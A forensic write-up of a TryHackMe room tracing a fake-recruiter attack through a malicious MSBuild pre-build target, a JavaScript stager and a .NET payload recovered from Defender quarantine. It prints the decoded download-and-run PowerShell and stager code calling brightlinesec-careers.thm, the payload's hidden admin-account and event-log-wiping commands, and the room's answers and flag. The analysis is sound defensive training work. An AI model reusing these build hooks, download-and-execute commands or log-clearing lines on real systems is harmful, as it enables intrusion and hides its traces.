# TryHackMe The Interview: Forensic Investigation Write-up

| | |
|---|---|
| **Room** | The Interview <https://tryhackme.com/room/theinterview> |
| **Category** | Incident Response / Windows Disk Forensics / Malware Triage |
| **Evidence** | `Desktop\the-interview\capture.E01` (Windows disk image of `rpike`'s workstation) |
| **Tooling** | FTK Imager 8.3.0.27, CyberChef, dnSpy 6.1.8, `defender-dump` (modified), Neovim, WSL (Kali) |
| **Hostname (lab VM)** | `THM-INTERVIEW` |
| **Status** | Room completed all questions answered |

---

## 1. Executive Summary

Randall Pike, a security researcher at Unbaitable Training Co., was targeted by a **fake recruiter campaign** impersonating *Brightline Security Partners*. The "technical assessment" he received was a password-protected ZIP containing a Visual Studio C# project. The project file (`TechnicalAssessment.csproj`) carried a malicious **MSBuild pre-build target** that executed a Base64-encoded PowerShell command the moment the solution was built. That command pulled a JavaScript stager (`stager.js`) from `brightlinesec-careers.thm`, which in turn downloaded and launched a .NET payload (`Ms1.exe`).

`Ms1.exe` was caught and quarantined by Microsoft Defender about two minutes after the build, but the investigation shows the payload was built to do four things: **create a look-alike local administrator (`support_tech`)**, **AES-encrypt a file in the victim's Documents folder**, **delete the original**, and **wipe the Windows event logs**. Randall acted on the alert, but could not be sure it was soon enough, and with good reason. The encrypted report in `Documents` held a confidential data set, and the account creation and log clearing mean there is no guarantee the system is clean.

The same chain also leads to the room flag, which was hidden inside the encrypted report that the malware had locked.

---

## 2. Answers at a Glance

**Q1 What email address sent the technical assessment?**
```text
ecarter@brightlinesec-careers.thm
```

**Q2 Which file contains the command responsible for initiating the compromise?**
```text
TechnicalAssessment.csproj
```

**Q3 What is the full URL used to download the executable payload?**
```text
http://brightlinesec-careers.thm/Ms1.exe
```

**Q4 What is the SHA-256 hash of the executable payload?**
```text
7d2a9987b74bfcd69bf27db91462f3e90ad7fdb281a7ac71eb1554b373d39df0
```

**Q5 Which local account does the payload attempt to add to the Administrators group?**
```text
support_tech
```

**Q6 What encryption key was used to protect the report?**
```text
1NT3RV13W_W3NT_R0GU3_3SC4P3D_133
```

**Q7 What is the flag?**
```text
THM{H3y_S0_1s_iT_S4f3_T0_SaY_Th3_InterVi3w_W3nT_W3ll?!}
```

---

## 3. Investigation Walkthrough (Chronological)

> **Note on timing:** The room took several days to complete (the lab instance expired and had to be redeployed, which changed the target IP). Screenshots from 2026‑11‑23 cover the first session, and those from 2026‑11‑25 cover the second.

### Phase 0 Lab Preparation and Remote Access

#### Step 0.1 Starting the room

I opened the room page and read the scenario before deploying anything. Room progress was at 12% at this point.

![Room landing page](screenshots/Screenshot%202026-11-23%20184348.jpg)

#### Step 0.2 Mapping the target IP to a hostname via the hosts file

Working with an IP that changes every deployment is error-prone, so I pinned a stable name for the machine. I used my own shell helper, which takes the current directory name (`the.interview`) and writes a hosts entry of `<dirname>.thm`.

```bash
new_host $(basename $PWD).thm
```

The helper confirmed the mapping:

```text
Source Host : 10.82.154.29
Redirection : the.interview.thm
Description : The Interview Room On TryHackMe
```

![new_host mapping 10.82.154.29 to the.interview.thm](screenshots/Screenshot%202026-11-23%20184519.jpg)

#### Step 0.3 Deploying the Windows analysis VM

I started the in-browser VM (`The-Interview-v0.2`, Windows 10). The desktop contained the two items the room describes: the `the-interview` folder (holding `capture.E01`) and the `tools` folder.

![Windows 10 analysis VM desktop](screenshots/Screenshot%202026-11-23%20184710.jpg)

#### Step 0.4 Setting a password on the Administrator account to enable RDP

The in-browser console is limited, and for a multi-day investigation I wanted fuller control of the VM (clipboard, file transfer, resizable window) over RDP, so from the in-browser session I used an elevated Command Prompt to list local accounts and then set a password on the built-in `Administrator`.

```cmd
net user
```

```cmd
net user Administrator *
```

The `*` makes Windows prompt for the password interactively, so it never appears in the command line or history. (The password itself is intentionally not reproduced here.) Local accounts on the lab VM were `Administrator`, `DefaultAccount`, `Guest` and `WDAGUtilityAccount`.

![net user and net user Administrator *](screenshots/Screenshot%202026-11-23%20185437.jpg)

#### Step 0.5 Connecting over RDP

With the password set, I opened the Remote Desktop client against the hosts-file name on port 3389 and authenticated as `Administrator` with "Remember me" ticked so I would not have to retype the credentials on reconnect.

```text
the.interview.thm:3389
```

![RDP credential prompt](screenshots/Screenshot%202026-11-23%20185511.jpg)

The session connected and the same desktop, including my previous Command Prompt window, appeared inside the RDP window.

![RDP session established](screenshots/Screenshot%202026-11-23%20185552.jpg)

#### Step 0.6 The lab instance expired: updating the IP

Two days later the original instance had expired and I had to redeploy. The new machine came up on a different address, so I updated the hosts entry rather than changing every saved shortcut and RDP profile.

```bash
edit_host $(basename $PWD).thm
```

```text
Redirection  : the.interview.thm
Source IP    : 10.82.154.29
Enter New IP : 10.82.172.225
```

![edit_host changing the IP to 10.82.172.225](screenshots/Screenshot%202026-11-25%20153327.jpg)

---

### Phase 1 Mounting the Evidence

#### Step 1.1 Locating FTK Imager

Inside the RDP session I opened `tools\ftk` and launched the **Exterro FTK Imager** shortcut.

![tools\ftk folder](screenshots/Screenshot%202026-11-25%20154900.jpg)

#### Step 1.2 Mounting `capture.E01` read-only

From **File → Image Mounting** I mounted the evidence image. The settings matter for forensic soundness:

| Setting | Value |
|---|---|
| Image File | `C:\Users\Administrator\Desktop\the-interview\capture.E01` |
| Mount Type | Physical & Logical |
| Drive Letter | Next Available (`D:`) |
| Mount Method | **Block Device / Read Only** |

```text
C:\Users\Administrator\Desktop\the-interview\capture.E01
```

Mounting read-only guarantees I cannot alter the evidence, which keeps the investigation defensible.

![FTK Imager Mount Image To Drive dialog](screenshots/Screenshot%202026-11-25%20155054.jpg)

#### Step 1.3 First look at the mounted volume

The image appeared as `D:`. The top level looked like a normal Windows installation: `inetpub`, `PerfLogs`, `Program Files`, `Program Files (x86)`, `Users`, `Windows` and `vboxpostinstall` (a VirtualBox artefact, so the original was a VM).

![D: top level](screenshots/Screenshot%202026-11-25%20155359.jpg)

#### Step 1.4 Revealing hidden items

`ProgramData` was not listed because it is a hidden folder. I enabled **View → Hidden items**, which exposed it. This matters: **Windows Defender's quarantine store lives under `ProgramData`**, and I would need it later.

![Hidden items enabled, ProgramData visible](screenshots/Screenshot%202026-11-25%20155500.jpg)

---

### Phase 2 Initial Access: The Phishing Email

#### Step 2.1 Profile triage: `D:\Users\rpike`

Only one real user profile exists, `rpike`. Several folders stood out: `Desktop`, `Documents`, `Downloads`, a `source` folder, and developer-tooling folders (`.dotnet`, `.templateengine`) that were created around 12:11–12:13 AM on 11/16, consistent with someone installing Visual Studio / .NET tooling. This profile showed the victim had been working with a C# toolchain just before the incident.

```text
D:\Users\rpike
```

![D:\Users\rpike profile](screenshots/Screenshot%202026-11-25%20155557.jpg)

#### Step 2.2 The interview folder on the Desktop

`D:\Users\rpike\Desktop\Brightline_Interview` contained exactly two items:

- `Assessment_Invite.eml` (the email, saved 11/16 at 6:17 AM)
- `CandidateAssessment.zip` (the attachment, saved 11/16 at 6:16 AM)

```text
D:\Users\rpike\Desktop\Brightline_Interview
```

![Brightline_Interview folder](screenshots/Screenshot%202026-11-25%20155746.jpg)

#### Step 2.3 Reading the email (Q1)

I opened `Assessment_Invite.eml` in Notepad. The headers answer the first question directly:

```text
From: Emily Carter <ecarter@brightlinesec-careers.thm>
To: Randall Pike <rpike@donttakethebait.thm>
Subject: Next step: technical assessment (Head of Security Awareness)
Date: Mon, 09 Nov 2026 11:22:00 +0000
```

![Assessment_Invite.eml opened in Notepad](screenshots/Screenshot%202026-11-25%20155823.jpg)

**Answer to Q1:**

```text
ecarter@brightlinesec-careers.thm
```

**Social-engineering indicators in the email body** (several are textbook for this lure style):

1. **Lookalike/careers sub-brand domain** (`brightlinesec-careers.thm`) rather than the company's primary domain.
2. **Flattery plus a career-advancement hook**: the team was "really impressed" with Randall's work, targeted at a security professional.
3. **Password-protected archive** (`Brightline2026`), which defeats gateway and AV scanning of the contents.
4. **A pretext for executing code**: step 2 says to "build the solution once" because "the build registers your candidate ID with our harness". A legitimate assessment has no reason to require this.
5. **Artificial urgency**: the slot is held only "until end of day Friday".
6. **Secrecy request**: "keep the materials to yourself", which discourages the victim from asking colleagues.

#### Step 2.4 The extracted project

Randall extracted the archive to `Desktop\development\TechnicalAssessment` (files timestamped 7:45 PM on 11/16). The `.vs`, `bin` and `obj` folders were created at **8:04 PM**, which is the moment he opened the project in Visual Studio and built it. Everything from here on is a consequence of that build.

```text
D:\Users\rpike\Desktop\development\TechnicalAssessment
```

![TechnicalAssessment project folder](screenshots/Screenshot%202026-11-25%20155923.jpg)

---

### Phase 3 Evidence Acquisition to the Analysis Workstation

I do not like doing deep analysis inside a lab VM. I copied the artefacts to my own Kali WSL workspace so I could use my normal tooling and keep notes alongside them.

#### Step 3.1 Copying the project out of the RDP session

I dragged the `development` tree across to the WSL share (`\\wsl.localhost\kali-linux\...\the.interview\files`).

![Copying development to WSL](screenshots/Screenshot%202026-11-25%20160124.jpg)

#### Step 3.2 Copying the email folder

Next came `Brightline_Interview`, which now showed beside `development` in my `files` directory.

![development copied](screenshots/Screenshot%202026-11-25%20160422.jpg)

![Brightline_Interview copied](screenshots/Screenshot%202026-11-25%20160452.jpg)

#### Step 3.3 Confirming the structure

```bash
tree
```

The tree confirmed the project layout, which includes a `.csproj`, a `.sln`, `App.config`, `ReportParser.cs` and `Properties\AssemblyInfo.cs`, plus build output directories.

![tree of the files directory](screenshots/Screenshot%202026-11-25%20160514.jpg)

---

### Phase 4 Execution: Finding the Malicious Build Step (Q2)

#### Step 4.1 Reviewing the project file

The `.cs` files are the obvious place to look, but with a lure that says "build the solution", the build definition is the better suspect. I opened the project file in Neovim:

```bash
nvim TechnicalAssessment.csproj
```

The first 27 lines are standard MSBuild boilerplate (framework v4.8, Debug/Release property groups).

![csproj opened in Neovim](screenshots/Screenshot%202026-11-25%20160535.jpg)

#### Step 4.2 The `Exec` target (Q2)

At the end of the file, after the `Microsoft.CSharp.targets` import, sits a target with a deliberately bland name, `GetFrameworkPaths`, set to run **`BeforeTargets="Build"`**, which contains an `Exec` task invoking PowerShell with an encoded command:

```xml
<Target Name="GetFrameworkPaths" BeforeTargets="Build">
  <Exec Command="powershell -enc JABkAGkAcgAgAD0AIAAkAGUAbgB2ADoAVABFAE0AUAA7ACAA..." />
</Target>
```

This is the line that executes the instant the solution is built. Note it is **not** in `ReportParser.cs`, which contains only a decoy login demo.

![The Exec command in TechnicalAssessment.csproj](screenshots/Screenshot%202026-11-25%20160651.jpg)

**Answer to Q2:**

```text
TechnicalAssessment.csproj
```

> **Side note, the decoy flag:** `ReportParser.cs` contains a hard-coded fake "portal" that prints `THM{YOU_THOUGHT_IT_WILL_BE_TH1S_EASY??}`. This is a deliberate red herring. It is **not** the room flag. The real flag is recovered in Phase 8.

#### Step 4.3 Decoding the PowerShell (Base64 → UTF‑16LE)

`powershell -enc` expects **Base64 of a UTF‑16LE string**. In CyberChef I pasted the blob (428 characters) into the input pane.

![Encoded blob pasted into CyberChef](screenshots/Screenshot%202026-11-25%20160700.jpg)

I then applied the recipe `From Base64` followed by `Remove null bytes` (the nulls are the high bytes of the UTF‑16LE characters).

```text
From_Base64('A-Za-z0-9+/=',true,false)
Remove_null_bytes()
```

The output was a single, readable 160‑character command:

```powershell
$dir = $env:TEMP; $file = Join-Path $dir "stager.js"; Invoke-WebRequest -Uri "http://brightlinesec-careers.thm/stager.js" -OutFile $file; cscript //nologo $file
```

![CyberChef recipe and decoded output](screenshots/Screenshot%202026-11-25%20160751.jpg)

What it does: it downloads `stager.js` into `%TEMP%` and runs it silently with the Windows Script Host (`cscript //nologo`). That is stage one.

#### Step 4.4 Preserving the recipe

I saved the CyberChef permalink so the analysis is reproducible and can be re-opened later:

```bash
base64.decode.cyberchef.link
```

![CyberChef link saved to decryption/](screenshots/Screenshot%202026-11-25%20160830.jpg)

I also pasted the decoded command into Notepad as a scratch record.

![Decoded command in Notepad](screenshots/Screenshot%202026-11-25%20160851.jpg)

---

### Phase 5 Second Stage: `stager.js` and the Payload URL (Q3)

#### Step 5.1 Finding the dropped script on the mounted disk

If the build really executed the command, the script must exist on disk. I browsed the victim's temp directory on the mounted image.

```text
D:\Users\rpike\AppData\Local\Temp
```

`stager.js` was present: **595 bytes, last modified 11/16/2026 at 8:04 PM**, which matches the build time exactly. That also confirms the build step ran on the victim machine. A `TFR8754.tmp` file written a minute later (8:05 PM) sits alongside it.

![stager.js in the victim's Temp directory](screenshots/Screenshot%202026-11-25%20161137.jpg)

#### Step 5.2 Exporting it

I copied `stager.js` (595 bytes) across to my WSL `files` directory.

![stager.js copied to WSL](screenshots/Screenshot%202026-11-25%20161201.jpg)

#### Step 5.3 Reading the stager (Q3)

I opened it in Neovim:

```bash
nvim stager.js
```

The script is short. It creates `WScript.Shell` and `Scripting.FileSystemObject` ActiveX objects, resolves `%TEMP%`, and sets the target path to `%TEMP%\Ms1.exe`:

![stager.js in Neovim](screenshots/Screenshot%202026-11-25%20161217.jpg)

![Ms1.exe path selected in stager.js](screenshots/Screenshot%202026-11-25%20161235.jpg)

The download itself is another PowerShell invocation. The full logic is:

```javascript
var binPath = sysCache + "\\Ms1.exe";

var fetchCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://brightlinesec-careers.thm/Ms1.exe' -OutFile '" + binPath + "'\"";

wsh.Run(fetchCmd, 0, true);   // hidden window, wait for completion
wsh.Run(binPath, 0, false);   // hidden window, execute, do not wait
```

Both calls use window style `0` (hidden), so the victim would have seen nothing. `-ExecutionPolicy Bypass` and `-NoProfile` minimise interference from local policy.

**Answer to Q3:**

```text
http://brightlinesec-careers.thm/Ms1.exe
```

---

### Phase 6 Recovering the Payload from Defender Quarantine (Q4)

The payload was written to `%TEMP%\Ms1.exe`, but it is no longer there. That is expected. Windows Defender quarantined it, and the original file was removed. Defender keeps an **encrypted** copy in its quarantine store, which can be recovered.

#### Step 6.1 Choosing the tool

I used the open-source `defender-dump` project by Nikola Knežević, which decrypts Defender's quarantine format (an RC4 variant with a hard-coded key from `mpengine.dll`) and extracts the original file.

![knez/defender-dump on GitHub](screenshots/Screenshot%202026-11-25%20161813.jpg)

I cloned it into my `decryption` directory and saved the repository link:

```bash
gh repo clone knez/defender-dump
```

```bash
defender-dump.repo.link
```

![Cloning defender-dump](screenshots/Screenshot%202026-11-25%20161841.jpg)

#### Step 6.2 Copying the quarantine store from the image

Defender's quarantine lives in `ProgramData\Microsoft\Windows Defender\Quarantine` (this is why I enabled hidden items in Step 1.4). It holds three subfolders:

- `Entries`: metadata (original path, detection name, timestamp)
- `ResourceData`: the encrypted file contents
- `Resources`: additional metadata

```text
D:\ProgramData\Microsoft\Windows Defender\Quarantine
```

I copied the whole `Quarantine` folder to my `files` directory.

![Quarantine folder contents being copied](screenshots/Screenshot%202026-11-25%20162017.jpg)

#### Step 6.3 Adapting the script (my modification)

> **Script modification disclosure:** I downloaded `defender-dump.py` in my WSL environment, and **I tweaked it slightly** to fit my workflow. The upstream script expects a *mounted Windows root* (e.g. `/mnt/win`) and builds the path `ProgramData/Microsoft/Windows Defender/Quarantine` underneath it. Because I had copied out only the `Quarantine` directory itself, I commented out the upstream line and pointed `basedir` directly at a local `Quarantine` folder instead. I also left myself an inline comment explaining why. No cryptographic or parsing logic was changed.

The change, in diff form:

```diff
 def main(args):

-    basedir = args.rootdir / 'ProgramData/Microsoft/Windows Defender/Quarantine'
+    # basedir = args.rootdir / 'ProgramData/Microsoft/Windows Defender/Quarantine'

+    # we have our own version on linux lol
+    basedir = args.rootdir / 'Quarantine'

     entries = parse_entries(basedir)
```

Edited in Neovim (insert mode, line 158):

![Tweaking defender-dump.py in Neovim](screenshots/Screenshot%202026-11-25%20162819.jpg)

#### Step 6.4 Running the dump

With the root directory set to `.` (the directory containing `Quarantine`):

```bash
python3 defender-dump.py . --dump
```

```text
Exporting Ms1.exe
File 'quarantine.tar' successfully created
```

![defender-dump exporting Ms1.exe](screenshots/Screenshot%202026-11-25%20162908.jpg)

**Additional verification (listing mode).** To corroborate the story I also ran the script *without* `--dump`, which prints the detection metadata from the quarantine entry. I did this after the capture and it is not in the screenshots:

```bash
python3 defender-dump.py .
```

```text
2026-11-16 20:06:19.758799 Trojan:MSIL/CobaltStrike.SPVX!MTB   C:\Users\rpike\AppData\Local\Temp\Ms1.exe
```

Defender detected the payload at **20:06:19 UTC on 2026-11-16**, roughly **two minutes after** `stager.js` was written at 20:04. It classified it as a .NET Cobalt Strike-family trojan, and the original path matches `stager.js`'s `%TEMP%\Ms1.exe` exactly. This closes the loop between the stager and the quarantined binary.

#### Step 6.5 Extracting and hashing the payload (Q4)

```bash
tar -xf quarantine.tar
```

```bash
ls
```

```bash
sha256sum Ms1.exe
```

```text
7d2a9987b74bfcd69bf27db91462f3e90ad7fdb281a7ac71eb1554b373d39df0  Ms1.exe
```

![Extracting Ms1.exe and computing its SHA-256](screenshots/Screenshot%202026-11-25%20163026.jpg)

The extracted file is 7,680 bytes.

**Answer to Q4:**

```text
7d2a9987b74bfcd69bf27db91462f3e90ad7fdb281a7ac71eb1554b373d39df0
```

---

### Phase 7 Reverse Engineering `Ms1.exe` (Q5, Q6)

The payload is a .NET assembly, so a decompiler is the right tool. dnSpy is provided in the lab's `tools` folder. I verified the upstream project first (it is archived, final release v6.1.8, matching the lab's version).

![dnSpy GitHub repository](screenshots/Screenshot%202026-11-25%20163543.jpg)

> **Safety:** I never executed the sample. dnSpy only loads the assembly for static decompilation. I also transferred it into the isolated lab VM rather than analysing it on my host.

#### Step 7.1 Moving the sample into the lab VM

To move the sample into the VM safely I wrapped it in a ZIP for transport:

```bash
zip -rv ms1.zip Ms1.exe
```

```text
  adding: Ms1.exe       (in=7680) (out=3572) (deflated 53%)
total bytes=7680, compressed=3572 → 53% savings
```

![Zipping Ms1.exe for transfer](screenshots/Screenshot%202026-11-25%20164039.jpg)

I transferred `ms1.zip` through RDP and extracted it to `C:\Users\Administrator\Desktop\ms1\` on the VM.

![ms1.zip on the VM desktop with dnSpy open](screenshots/Screenshot%202026-11-25%20164112.jpg)

#### Step 7.2 Loading the assembly in dnSpy

From dnSpy's **File → Open**, I selected the extracted sample.

```text
C:\Users\Administrator\Desktop\ms1\Ms1.exe
```

![dnSpy Open dialog](screenshots/Screenshot%202026-11-25%20164150.jpg)

The assembly header shows the compile timestamp **`6AFB60E8` → 11/16/2026 8:00:40 PM**, about four minutes before the victim's build (8:04 PM). The entry-point name is a long string of invisible Unicode characters (`\u206A\u202E\u202D...`), a clear sign of **name obfuscation**.

![Ms1 loaded in dnSpy with obfuscated entry point](screenshots/Screenshot%202026-11-25%20164202.jpg)

#### Step 7.3 Navigating the obfuscated types

Expanding `Ms1.exe` shows a `ConfusedByAttribute` type. That is the signature the ConfuserEx obfuscator leaves behind. Every class, method and field name is made of zero-width and bidirectional-override characters (U+200B, U+202E, U+206A, ...) so they are unreadable and visually identical. The *logic*, however, decompiles cleanly, and P/Invoke declarations for `VirtualAlloc` and `CreateThread` from `kernel32.dll` are visible. These are common shellcode-loader primitives, although they are declared but not used in the recovered logic.

![Decompiled class with kernel32 imports](screenshots/Screenshot%202026-11-25%20164250.jpg)

#### Step 7.4 Persistence/privilege action: the admin account (Q5)

The main routine sleeps 3.5 seconds and then launches an **elevated** `cmd.exe` (`Verb = "runas"`, which prompts UAC) to create a local account and add it to Administrators. I highlighted the relevant line:

```csharp
Arguments = "/c net user support_tech Str0ngAnDS3cureP4ssw0rd /add && net localgroup Administrators support_tech /add",
```

The account name `support_tech` is chosen to look like a legitimate IT/helpdesk account so it would blend in on a user list.

![net user ... /add in dnSpy](screenshots/Screenshot%202026-11-25%20164325.jpg)

**Answer to Q5:**

```text
support_tech
```

#### Step 7.5 The encryption routine (Q6)

Further down is a helper method wrapping .NET's `Aes` class. It sets `KeySize = 256`, uses the supplied key and IV, and calls `CreateEncryptor`, so it is **AES‑256 in CBC mode** (the .NET default mode and padding, PKCS7).

![AES encryption helper in dnSpy](screenshots/Screenshot%202026-11-25%20164420.jpg)

Two static byte arrays at the bottom of the class hold the **key** and **IV**, built from ASCII strings:

```csharp
private static readonly byte[] <key> = Encoding.UTF8.GetBytes("1NT3RV13W_W3NT_R0GU3_3SC4P3D_133");
private static readonly byte[] <iv>  = Encoding.UTF8.GetBytes("B3Y73_T0D3C_1V22");
```

The key is exactly 32 characters (256 bits) and the IV exactly 16 (the AES block size), which confirms the parameters are valid.

![Key highlighted in dnSpy](screenshots/Screenshot%202026-11-25%20164506.jpg)

**Answer to Q6 (encryption key):**

```text
1NT3RV13W_W3NT_R0GU3_3SC4P3D_133
```

**IV, needed for decryption, not asked in the room:**

```text
B3Y73_T0D3C_1V22
```

I saved the decompiled output to the `decryption` folder as `ms1.dnspy.reverse.content` for the record.

#### Step 7.6 Full behavioural summary of `Ms1.exe`

From the decompiled `Main` routine, the complete behaviour is:

| Order | Action | Detail |
|---|---|---|
| 1 | Delay | `Thread.Sleep(3500)` (a crude sandbox/timing evasion) |
| 2 | Create admin | Elevated `cmd.exe /c net user support_tech <pwd> /add && net localgroup Administrators support_tech /add` |
| 3 | Encrypt a file | Enumerates the user's *Personal* (`Documents`) folder; for the first file that does **not** already end in `.enc`: reads it, AES-256-CBC encrypts it, writes `<name>.enc`, **deletes the original**, then **`break`s** the loop |
| 4 | Anti-forensics | `wevtutil cl Setup && wevtutil cl System && wevtutil cl Security && wevtutil cl Application` (hidden window) |

Two things deserve emphasis for a defender:

- Because of the `break`, **only one file** is encrypted per run. That file is the target of the next phase.
- Step 4 means the **Windows event logs on this host are not a reliable source**. This is why disk artefacts (Temp, quarantine, project files) were the correct approach in this case.

---

### Phase 8 Decrypting the Report and Recovering the Flag (Q7)

#### Step 8.1 Finding the encrypted victim file

The "what did he overlook?" part of the scenario points to the Documents folder. In `D:\Users\rpike\Documents` there is a `Visual Studio 18` folder, and a 640‑byte file with an unusual name:

```text
D:\Users\rpike\Documents\BrightlineSecPartners-InternalReportQ4.csv.enc
```

The `.enc` extension matches the payload's output convention, and the original `.csv` is gone, matching the `File.Delete` call. I copied it to my `files` directory.

![Documents folder showing the .enc file](screenshots/Screenshot%202026-11-25%20164949.jpg)

To move between my host and the RDP session, I used my `winpath` helper to copy the Windows-style path of the current directory to my clipboard:

```bash
winpath
```

```text
Windows Path Copied.
```

![winpath copying the Windows path](screenshots/Screenshot%202026-11-25%20165019.jpg)

#### Step 8.2 Loading the file into CyberChef

In CyberChef I used **Open file as input** and selected the encrypted report from my `files` folder.

![Opening the .enc file in CyberChef](screenshots/Screenshot%202026-11-25%20165034.jpg)

#### Step 8.3 First attempt fails (input format mismatch)

I configured **AES Decrypt** with the recovered parameters:

| Parameter | Value |
|---|---|
| Key (UTF8) | `1NT3RV13W_W3NT_R0GU3_3SC4P3D_133` |
| IV (UTF8) | `B3Y73_T0D3C_1V22` |
| Mode | CBC |
| Input | **Hex** (initial setting) |
| Output | Raw |

CyberChef returned `Unable to decrypt input with these parameters.`

![AES Decrypt failing with Input set to Hex](screenshots/Screenshot%202026-11-25%20165043.jpg)

This was not a wrong key. The ciphertext is **raw binary**, not a hex string, and I had left the operation's **Input** dropdown on `Hex`. Hex-decoding binary data yields the wrong bytes, so the ciphertext is no longer a valid multiple of the AES block size and decryption fails.

#### Step 8.4 Correcting the input type

Switching **Input** to `Raw` fixed it. The 640-byte file decrypted to a 635-byte CSV:

```text
AES_Decrypt({'option':'UTF8','string':'1NT3RV13W_W3NT_R0GU3_3SC4P3D_133'},{'option':'UTF8','string':'B3Y73_T0D3C_1V22'},16,'CBC','Raw','Raw',...)
```

The plaintext (shown with the `Access_Token` field of the last row):

```csv
Report_ID,Analyst,Classification,Target_System,Vulnerability,CVSS_Score,Status,Access_Token
RPT-2026-001,Dr. Sarah Chen,CONFIDENTIAL,AURORA-PROD-01,Unpatched RCE via Log4Shell variant,9.8,REMEDIATED,
RPT-2026-002,Marcus Webb,SECRET,ORION-GATEWAY,Weak credential policy on VPN endpoint,7.5,OPEN,
RPT-2026-003,Priya Nair,CONFIDENTIAL,INTERNAL-CA,Certificate misconfiguration allows MITM,8.1,IN-PROGRESS,
RPT-2026-004,James Holloway,TOP-SECRET,AURORA-PROD-01,Insider threat indicator - anomalous data access,N/A,ESCALATED,54484d7b4833795f53305f31735f69545f533466335f54305f5361595f5468335f496e746572566933775f57336e545f57336c6c3f217d
```

![Decrypted report in CyberChef](screenshots/Screenshot%202026-11-25%20165133.jpg)

I independently re-verified the decryption outside CyberChef with OpenSSL (not in the screenshots), and the output was byte-identical:

```bash
openssl enc -d -aes-256-cbc \
  -K $(printf '1NT3RV13W_W3NT_R0GU3_3SC4P3D_133' | xxd -p -c64) \
  -iv $(printf 'B3Y73_T0D3C_1V22' | xxd -p -c64) \
  -in BrightlineSecPartners-InternalReportQ4.csv.enc
```

The report is itself a notable finding: it is an **internal client report classified up to TOP-SECRET**, listing vulnerabilities and affected systems (AURORA-PROD-01, ORION-GATEWAY, INTERNAL-CA). The last row (`RPT-2026-004`, status `ESCALATED`) has an `Access_Token` column filled with a long hexadecimal string, unlike every other row.

#### Step 8.5 Decoding the token (Q7)

The `Access_Token` value is hex. I decoded it with CyberChef's `From Hex` (delimiter `Auto`):

```text
54484d7b4833795f53305f31735f69545f533466335f54305f5361595f5468335f496e746572566933775f57336e545f57336c6c3f217d
```

![From Hex revealing the flag](screenshots/Screenshot%202026-11-25%20165329.jpg)

**Answer to Q7 (flag):**

```text
THM{H3y_S0_1s_iT_S4f3_T0_SaY_Th3_InterVi3w_W3nT_W3ll?!}
```

(The flag text, "Hey, so is it safe to say the interview went well?!", is the room's wry nod to the scenario.)

#### Step 8.6 Saving the recipes and completing the room

I stored both CyberChef permalinks next to the other decryption artefacts, so the entire chain is reproducible:

```bash
flag.hex.decode.cyberchef.link
```

```bash
encryption.decode.cyberchef.link
```

![Saved CyberChef links](screenshots/Screenshot%202026-11-25%20165428.jpg)

I submitted all answers and the room reported completion.

![Room completed](screenshots/Screenshot%202026-11-25%20165346.jpg)

---

## 4. Reconstructed Attack Timeline

All times below are from artefacts on the evidence image (UTC / VM clock).

| Date & time | Event | Evidence |
|---|---|---|
| 2026-11-09 11:22 | Phishing email sent by `ecarter@brightlinesec-careers.thm` | `Assessment_Invite.eml` headers |
| 2026-11-16 ~00:08–00:13 | Developer tooling folders created (`.dotnet`, `.templateengine`, `ProgramData`, `Program Files (x86)`), consistent with a .NET/Visual Studio install | Folder timestamps |
| 2026-11-16 06:16–06:17 | Email and attachment saved to Desktop | `Brightline_Interview` listing |
| 2026-11-16 19:45 | Project extracted to `Desktop\development\TechnicalAssessment` | File timestamps |
| 2026-11-16 20:00:40 | `Ms1.exe` was compiled (attacker side) | PE timestamp `6AFB60E8` |
| 2026-11-16 20:04 | Solution built in Visual Studio; `.csproj` `Exec` target runs; `stager.js` dropped | `.vs`/`bin`/`obj` and `stager.js` timestamps |
| 2026-11-16 20:04–20:05 | `stager.js` downloads and runs `Ms1.exe` from `%TEMP%` | `stager.js` logic; `TFR8754.tmp` |
| 2026-11-16 20:06:19 | Defender detects and quarantines `Trojan:MSIL/CobaltStrike.SPVX!MTB` | Quarantine entry |
| Around execution | Admin account `support_tech` creation attempted; Documents file encrypted; event logs cleared | `Ms1.exe` decompilation; `.csv.enc` in Documents |

---

## 5. Indicators of Compromise (IOCs)

**Network / Infrastructure**

```text
brightlinesec-careers.thm
http://brightlinesec-careers.thm/stager.js
http://brightlinesec-careers.thm/Ms1.exe
ecarter@brightlinesec-careers.thm
```

**Files and hashes**

```text
Ms1.exe  (7,680 bytes)
SHA-256: 7d2a9987b74bfcd69bf27db91462f3e90ad7fdb281a7ac71eb1554b373d39df0
```

```text
%TEMP%\stager.js           (595 bytes)
%TEMP%\Ms1.exe
CandidateAssessment.zip    (password: Brightline2026)
TechnicalAssessment.csproj (contains malicious pre-build target "GetFrameworkPaths")
```

**Host artefacts**

```text
Local account: support_tech  (password set to: Str0ngAnDS3cureP4ssw0rd)
D:\Users\rpike\Documents\BrightlineSecPartners-InternalReportQ4.csv.enc
Defender detection: Trojan:MSIL/CobaltStrike.SPVX!MTB
```

**Cryptographic material (for recovery)**

```text
AES-256-CBC key: 1NT3RV13W_W3NT_R0GU3_3SC4P3D_133
IV:              B3Y73_T0D3C_1V22
```

**Behavioural detection strings**

```text
powershell -enc JABkAGkAcgAg...
cscript //nologo %TEMP%\stager.js
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest ..."
wevtutil cl Setup && wevtutil cl System && wevtutil cl Security && wevtutil cl Application
net user support_tech ... /add && net localgroup Administrators support_tech /add
```

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | Observed behaviour |
|---|---|---|
| Initial Access | T1566.001, Spearphishing Attachment | Fake recruiter email with `CandidateAssessment.zip` |
| Execution | T1204.002, User Execution: Malicious File | Victim builds the project as instructed |
| Execution | T1127.001, Trusted Developer Utilities Proxy Execution (MSBuild) | `Exec` task in a `.csproj` pre-build target |
| Execution | T1059.001, PowerShell | `powershell -enc ...` and `Invoke-WebRequest` |
| Execution | T1059.007, JavaScript | `stager.js` run through `cscript` |
| Defence Evasion | T1027, Obfuscated Files or Information | Base64/UTF-16LE command; ConfuserEx-style name obfuscation |
| Defence Evasion | T1140, Deobfuscate/Decode Files or Information | Encoded PowerShell command |
| Defence Evasion | T1036, Masquerading | Account named `support_tech`; innocuous target name `GetFrameworkPaths` |
| Defence Evasion | T1070.001, Clear Windows Event Logs | `wevtutil cl` on four logs |
| Command and Control | T1105, Ingress Tool Transfer | `stager.js` and `Ms1.exe` downloaded over HTTP |
| Persistence | T1136.001, Create Account: Local Account | `net user support_tech ... /add` |
| Privilege Escalation | T1548.002, Bypass/Abuse of UAC (elevation prompt) | `Verb = "runas"` |
